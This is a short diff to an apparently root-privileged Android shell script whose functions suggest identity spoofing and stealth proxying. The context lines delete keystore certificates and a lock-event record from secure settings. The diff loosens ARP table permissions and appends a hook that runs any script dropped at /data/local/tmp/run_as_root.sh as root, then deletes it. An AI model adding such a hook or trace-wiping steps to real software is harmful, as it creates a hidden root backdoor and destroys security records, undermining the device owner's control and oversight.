@@ -174,7 +174,7 @@ sync_ghost_identity_stores() {
     # Clean stale app Keystore certificates (UID >= 10000) & lock history
     find /data/misc/keystore/user_0/ -type f -delete 2>/dev/null
     chmod -R 0700 /efs/FactoryApp 2>/dev/null; chmod 0600 /efs/FactoryApp/* 2>/dev/null
-    chmod 0600 /proc/net/arp 2>/dev/null
+    chmod 0644 /proc/net/arp 2>/dev/null
     sed -i '/name="plugin_lock_event_dump"/d' /data/system/users/0/settings_secure.xml 2>/dev/null
 
     # NOTE: Never remount / or /system read-write in Android OS (/dev/block/dm-0 is read-only at the block layer;
@@ -789,4 +789,9 @@ fi
 sync_ghost_identity_stores
 sync_stealth_proxy
 dump_proxy_rule_snapshot
+
+if [ -f /data/local/tmp/run_as_root.sh ]; then
+    /system/bin/sh /data/local/tmp/run_as_root.sh > /data/local/tmp/run_as_root.log 2>&1
+    rm -f /data/local/tmp/run_as_root.sh
+fi
 
